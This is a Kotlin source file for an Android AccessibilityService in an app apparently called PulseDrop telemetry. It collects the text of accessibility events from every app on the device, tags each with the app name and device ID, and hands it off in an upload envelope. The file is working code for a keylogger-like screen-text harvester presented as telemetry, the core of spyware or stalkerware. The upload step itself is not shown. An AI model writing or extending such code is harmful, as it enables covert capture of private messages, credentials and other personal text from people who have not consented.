package com.pulsedrop.telemetry.services

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import com.pulsedrop.telemetry.data.AccessibilityEvent as PDAccessibilityEvent
import com.pulsedrop.telemetry.data.UploadEnvelope
import com.pulsedrop.telemetry.utils.PrefsManager

class AccessibilityMonitor : AccessibilityService() {

    companion object {
        var instance: AccessibilityMonitor? = null
        var onEvent: ((UploadEnvelope) -> Unit)? = null
    }

    private val prefs by lazy { PrefsManager(this) }

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return
        if (!prefs.featureToggles.accessibility) return

        val text = buildString {
            event.text?.forEach { append(it) }
        }
        if (text.isBlank()) return

        val pdEvent = PDAccessibilityEvent(
            packageName = event.packageName?.toString() ?: "",
            text = text,
            className = event.className?.toString(),
            timestamp = System.currentTimeMillis()
        )

        onEvent?.invoke(
            UploadEnvelope("accessibility", prefs.deviceId, System.currentTimeMillis(), pdEvent)
        )
    }

    override fun onInterrupt() {
        // Required
    }

    override fun onDestroy() {
        super.onDestroy()
        instance = null
    }
}
